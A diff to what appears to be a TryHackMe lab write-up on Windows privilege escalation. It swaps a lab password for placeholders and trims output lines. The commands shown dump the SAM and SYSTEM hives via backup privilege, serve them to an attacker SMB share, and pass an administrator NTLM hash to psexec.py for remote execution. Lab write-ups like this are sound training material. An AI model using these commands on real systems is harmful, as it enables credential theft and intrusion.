@@ -37,10 +37,7 @@ SeRestorePrivilege            Restore files and directories  Disabled
 
 ```log
 C:\> reg save hklm\system C:\Users\THMBackup\system.hive
-The operation completed successfully.
-
 C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
-The operation completed successfully.
 ```
 
 <br/>
@@ -49,7 +46,7 @@ The operation completed successfully.
 
 ```bash
 attacker@machine:~$ mkdir share
-attacker@machine:~$ smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+attacker@machine:~$ smbserver.py -smb2support -username USER_NAME -password PASSWORD public share
 ```
 
 <br/>
@@ -73,7 +70,6 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 ```log
 attacker@machine:~$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
-
 [*] Requesting shares on 10.10.175.90.....
 [*] Found writable share ADMIN$
 [*] Uploading file nfhtabqO.exe
